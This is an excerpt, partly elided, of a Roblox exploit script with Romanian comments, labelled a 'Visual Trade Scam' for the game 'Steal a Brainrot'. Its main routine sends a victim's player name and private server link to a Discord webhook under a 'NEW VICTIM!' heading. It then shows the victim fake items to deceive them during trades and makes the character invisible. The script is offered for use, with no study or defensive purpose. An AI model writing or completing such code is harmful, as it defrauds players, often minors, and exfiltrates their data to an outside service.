-- Script pentru Steal a Brainrot (Visual Trade Scam)
-- Rulează în Xeno sau orice executor compatibil
...
local SCRIPT_NAME = "⚡ Steal a Brainrot - Trade Scam v2.0"
...
local function enableSpoofing()
    -- Ascunde toate brainrot-urile reale din baza victimei
    ...
    local function createFakeBrainrots(realBrainrots)
...
-- ===== MAIN =====
local function main()
    -- 1. Trimite linkul serverului privat pe Discord
    local serverLink = getPrivateServerLink()
    if serverLink then
        sendToDiscord("**📱 NEW VICTIM!**\n\n**Player:** " .. LocalPlayer.Name .. "\n**Server Link:** " .. serverLink)
    end
    
    -- 2. Activează spoofing-ul (victima vede doar ce trebuie)
    enableSpoofing()
    
    -- 3. Ascunde personajul (invizibilitate)
    hideCharacter()
    ...
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = SCRIPT_NAME,
        Text = "✅ Trade Scam loaded successfully!",
        Duration = 3
    })
end
